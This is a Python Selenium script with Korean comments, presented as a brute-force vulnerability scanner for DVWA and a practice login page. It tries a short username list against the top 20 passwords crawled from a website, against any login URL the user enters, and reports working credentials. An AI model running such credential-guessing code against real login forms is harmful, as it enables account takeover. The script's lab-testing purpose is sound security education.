from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait, Select
from selenium.webdriver.support import expected_conditions as EC
from brute_force_crawling import get_korean_password_list_with_selenium, url as crawl_url
import sys
import time
import datetime
from urllib.parse import urlparse, urlunparse
import random
import os
import json

# =========================================================
# 🌟 Brute Force 스캐너 설정 (데이터 연동) 🌟
# =========================================================

USERNAME_LIST = ["admin", "user", "test", "root"]
CACHE_FILE = 'password_crawling_cache.json'  # 🚨 캐시 파일 이름 정의
CACHE_EXPIRY_DAYS = 3  # 캐시 만료 기간을 3일로 설정

CRAWLED_PASSWORDS = []
PASSWORD_LIST = []


def load_passwords_from_cache():
    """캐시 파일에서 비밀번호 목록을 로드합니다. (3일 만료 로직 적용)"""
    if os.path.exists(CACHE_FILE):
        try:
            # 1. 파일 수정 시간 확인 및 만료 여부 체크
            file_mtime = os.path.getmtime(CACHE_FILE)
            cache_time = datetime.datetime.fromtimestamp(file_mtime)

            # 현재 시간과 캐시 파일 수정 시간의 차이 계산
            if datetime.datetime.now() - cache_time > datetime.timedelta(days=CACHE_EXPIRY_DAYS):
                print(f"[INFO] ⚠️ 캐시 파일이 {CACHE_EXPIRY_DAYS}일(3일)이 지나 만료되었습니다. 새로 크롤링합니다.")
                # 만료된 캐시 파일 삭제 후 None 반환 (크롤링 유도)
                os.remove(CACHE_FILE)
                return None

            # 2. 만료되지 않은 경우 로드
            with open(CACHE_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                print(f"[INFO] ✅ 캐시 파일에서 {len(data)}개의 비밀번호를 빠르게 로드했습니다. (만료 전)")
                return data

        except Exception as e:
            # 로드 중 오류 발생 시, 캐시 사용 포기
            print(f"[-] 캐시 파일 로드/만료 확인 오류 ({e}). 새로 크롤링을 시도합니다.")
            return None
    return None


def save_passwords_to_cache(passwords):
    """비밀번호 목록을 캐시 파일에 저장합니다."""
    try:
        with open(CACHE_FILE, 'w', encoding='utf-8') as f:
            json.dump(passwords, f, ensure_ascii=False, indent=4)
        print(f"[INFO] 💾 {len(passwords)}개의 비밀번호를 '{CACHE_FILE}'에 캐시했습니다.")
    except Exception as e:
        print(f"[-] 캐시 파일 저장 오류: {e}")


# ---------------------------------------------------------
# 🚨 메인 데이터 로딩 로직 (캐싱 적용)
# ---------------------------------------------------------
try:
    # 1. 캐시 시도
    cached_passwords = load_passwords_from_cache()

    if cached_passwords:
        CRAWLED_PASSWORDS = cached_passwords
    else:
        # 2. 캐시 실패/없음: 크롤링 진행
        print("[INFO] 🌐 캐시 파일 없음. 크롤링을 시작합니다. (시간 소요)")
        CRAWLED_PASSWORDS = get_korean_password_list_with_selenium(crawl_url)

        if CRAWLED_PASSWORDS:
            # 3. 크롤링 성공 시 캐시 저장
            save_passwords_to_cache(CRAWLED_PASSWORDS)
        else:
            print("[-] 크롤링에 실패했습니다. 기본 목록도 사용하지 않고 종료합니다.")

    if CRAWLED_PASSWORDS:
        # 최종 PASSWORD_LIST 구성 (중복 제거)
        unique_passwords = []
        for p in CRAWLED_PASSWORDS:
            if p not in unique_passwords:
                unique_passwords.append(p)
        PASSWORD_LIST = unique_passwords
    else:
        PASSWORD_LIST = []  # 크롤링 실패 시 빈 목록 유지

except Exception as e:
    print(f"[-] 초기 데이터 로딩 중 치명적인 오류 발생: {e}")
    PASSWORD_LIST = []

# 🚨 [오류 해결] DVWA 및 일반 웹사이트의 성공/실패 지표를 명확히 분리 정의합니다.
# DVWA 지표
DVWA_SUCCESS_INDICATORS = ["Welcome to the password protected area", "Logout"]
DVWA_FAILURE_INDICATORS = ["Username and/or password incorrect", "Login Failed", "login and/or password incorrect"]

# 일반 웹사이트 지표 (vulnerable_login.php 기준)
GENERIC_SUCCESS_INDICATORS = ["✅ 로그인 성공: 환영합니다"]
GENERIC_FAILURE_INDICATORS = ["❌ 사용자 이름 또는 비밀번호가 올바르지 않습니다"]


# =========================================================
# 🌟 Selenium 기반 Brute Force 스캐너 🌟
# =========================================================

def setup_driver():
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument('--disable-gpu')
    options.add_argument('--no-sandbox')
    service = Service()
    return webdriver.Chrome(service=service, options=options)


def perform_dvwa_login_and_setup(driver, base_url):
    wait_long = WebDriverWait(driver, 20)

    LOGIN_URL = base_url + "login.php"
    SECURITY_URL = base_url + "security.php"

    # 로그인시도 주석
    # print(f"\nDVWA 접속 및 관리자 로그인 시도...")
    driver.get(LOGIN_URL)

    try:
        username_input = wait_long.until(EC.presence_of_element_located((By.NAME, "username")))
        password_input = wait_long.until(EC.presence_of_element_located((By.NAME, "password")))
        login_button = wait_long.until(EC.presence_of_element_located((By.NAME, "Login")))

        username_input.send_keys("admin")
        password_input.send_keys("password")
        login_button.click()
        time.sleep(2)

        if "Logout" in driver.page_source:
            # print("✅ 초기 로그인 성공 (admin/password)! 세션 확보.")

            driver.get(SECURITY_URL)
            time.sleep(2)

            select_element = wait_long.until(EC.presence_of_element_located((By.NAME, "security")))
            Select(select_element).select_by_value('low')

            submit_button = driver.find_element(By.NAME, 'seclev_submit')
            submit_button.click()
            time.sleep(2)

            # print("✅ 보안 레벨 'Low' 설정 완료.")
            return True
        else:
            print("❌ 초기 로그인 실패. admin/password 또는 DVWA 상태를 확인하세요.")
            return False

    except Exception as e:
        print(f"❌ 초기 로그인 중 오류 발생: {type(e).__name__}. URL: {driver.current_url}")
        return False


def scan_brute_force_with_selenium(driver, target_url, is_dvwa):
    vulnerabilities = []
    wait = WebDriverWait(driver, 15)

    # is_dvwa 여부에 따라 정의된 지표를 정확히 선택합니다.
    success_indicators = DVWA_SUCCESS_INDICATORS if is_dvwa else GENERIC_SUCCESS_INDICATORS
    failure_indicators = DVWA_FAILURE_INDICATORS if is_dvwa else GENERIC_FAILURE_INDICATORS

    shuffled_usernames = USERNAME_LIST[:]
    random.shuffle(shuffled_usernames)

    passwords_to_attempt = PASSWORD_LIST[:20]

    print(f"\n{target_url} 페이지로 이동하여 스캔 시작...")
    driver.get(target_url)

    total_attempts = len(shuffled_usernames) * len(passwords_to_attempt)
    print(f"[+] Brute Force 스캔 시작: 총 {total_attempts}가지 조합으로 정답을 찾습니다.")
    print(f"[INFO] ID 리스트와 비밀번호 리스트로 로그인 시도") #순서: {', '.join(shuffled_usernames)}"

    USER_FIELD = (By.NAME, "username")
    PASS_FIELD = (By.NAME, "password")
    LOGIN_BUTTON = (By.NAME, "Login")

    for user in shuffled_usernames:
        for passwd in passwords_to_attempt:

            # 🚨 [주석 처리 대상 1] 시도 시작 알림 (선택 사항)
            # print(f"  [ATTEMPT] ID='{user}', PW='{passwd}' 시도 중...")

            try:
                username_input = wait.until(EC.presence_of_element_located(USER_FIELD))
                password_input = wait.until(EC.presence_of_element_located(PASS_FIELD))
                login_button = wait.until(EC.presence_of_element_located(LOGIN_BUTTON))
            except Exception:
                print("  [ERROR] 로그인 폼 요소를 찾을 수 없습니다. (이름이 'username', 'password', 'Login'이 아닐 수 있습니다.)")
                return vulnerabilities

            username_input.clear()
            username_input.send_keys(user)
            password_input.clear()
            password_input.send_keys(passwd)

            login_button.click()
            time.sleep(1.5)

            page_source = driver.page_source.lower()

            is_success = any(indicator.lower() in page_source for indicator in success_indicators)
            is_failure = any(indicator.lower() in page_source for indicator in failure_indicators)

            # DVWA 전용 오탐 방지 로직
            if is_dvwa:
                is_success = is_success and (not is_failure)

            if is_success:
                vulnerabilities.append({
                    "type": "Brute Force (Successful Login)",
                    "details": f"성공적인 로그인: ID='{user}', PW='{passwd}'"
                })
                print(f"🎉 **[SUCCESS]** ID='{user}', PW='{passwd}' - 로그인 성공! 취약점 발견!")
                return vulnerabilities


            elif is_failure:
                # 🚨 [주석 처리 대상 2] 실패 알림
                # print(f"  [FAIL] ID='{user}', PW='{passwd}' -> 비밀번호 불일치")
                pass   # print를 주석 처리했으므로 pass를 넣어 문법 오류 방지

            else:
                # 🚨 [주석 처리 대상 3] 모호 알림
                # print(f"  [INFO] ID='{user}', PW='{passwd}' -> 응답 모호 (계속 시도)")
                pass  # # print를 주석 처리했으므로 pass를 넣어 문법 오류 방지

    return vulnerabilities


def print_password_list(password_list, source_url):
    if not password_list:
        print("\n--- 📝 크롤링된 사전 공격 목록 ---")
        print("  [경고] 비밀번호 목록이 비어있거나 크롤링에 실패했습니다. 스캐너를 종료합니다.")
        print("-------------------------------------")
        return

    print("\n--- 📝 크롤링된 사전 공격 목록 ---")

    passwords_to_display = password_list
    max_display = min(len(passwords_to_display), 20)

    current_index = 0

    while current_index < max_display:
        end_index = min(current_index + 7, max_display)

        line = []
        for i in range(current_index, end_index):
            line.append(f"{i + 1}위: {passwords_to_display[i]}")

        print('  ' + ' | '.join(line))
        current_index = end_index

    print(f"\n비밀번호 출처 : {source_url}")
    print("-------------------------------------")


def main():
    global PASSWORD_LIST

    print("--- 🛡️ Brute Force (무차별 대입) 탐지 스캐너 ---")

    full_url = input("테스트할 Brute Force 취약점 페이지 전체 URL을 입력하세요 : ").strip()

    if not full_url.startswith('http'):
        print("[-] URL은 'http' 또는 'https'로 시작해야 합니다. 종료합니다.")
        sys.exit(1)

    # 크롤링 실패 시 즉시 종료 로직
    if not PASSWORD_LIST:
        print("\n❌ 스캐너 실패: 유효한 사전 공격 목록을 확보하지 못했습니다. (크롤링 실패)")
        print_password_list(PASSWORD_LIST, crawl_url)
        sys.exit(1)

    # 크롤링 성공 시 목록 출력
    print_password_list(PASSWORD_LIST, crawl_url)

    driver = None
    results = []

    try:
        driver = setup_driver()

        is_dvwa = "/dvwa/" in full_url.lower()

        if is_dvwa:
            # print("\n[INFO] DVWA 환경을 감지했습니다. 초기 로그인 및 보안 레벨 설정을 시작합니다.")

            parsed_url = urlparse(full_url)
            path_segments = parsed_url.path.split('/')
            dvwa_index = path_segments.index('dvwa') if 'dvwa' in path_segments else -1

            if dvwa_index != -1:
                base_path = '/'.join(path_segments[:dvwa_index + 1]) + '/'
                base_url = urlunparse(parsed_url._replace(path=base_path, params='', query='', fragment=''))

                if not perform_dvwa_login_and_setup(driver, base_url):
                    print("❌ DVWA 초기 설정에 실패하여 스캔을 중단합니다.")
                    return
            else:
                print("[-] DVWA 기본 URL을 추출할 수 없습니다. DVWA 설정을 건너뛰고 바로 스캔을 시도합니다.")

        # 일반 웹 / DVWA 모두 이 함수 사용 (DVWA 여부 플래그 전달)
        results = scan_brute_force_with_selenium(driver, full_url, is_dvwa)

    except Exception as e:
        print(f"최종 오류 발생: {type(e).__name__} - {e}")

    finally:
        if driver:
            driver.quit()

    print("\n--- 🏁 스캔 결과 보고서 ---")
    if results:
        print(f"\n🚨🚨 **Brute Force 취약점 징후가 발견되었습니다.** 🚨🚨")
        for vuln in results:
            print(f"  - **취약점 있음**: {vuln.get('details', 'N/A')}")
            print(f"  - **권고 사항**: 사전/무차별 대입 공격에 취약합니다.")
    else:
        print("\n🎉 Brute Force 취약점 징후가 발견되지 않았습니다. (목록의 비밀번호가 정답이 아님)")


if __name__ == '__main__':
    main()

# brute_force 취약점 스캐너 코드의 단점 username 과 password 로만 찾음
# 여러 웹들중에서 input 하는 코드들이 너무 많기 때문에 찾는 특정 변수 명 정해줘야됨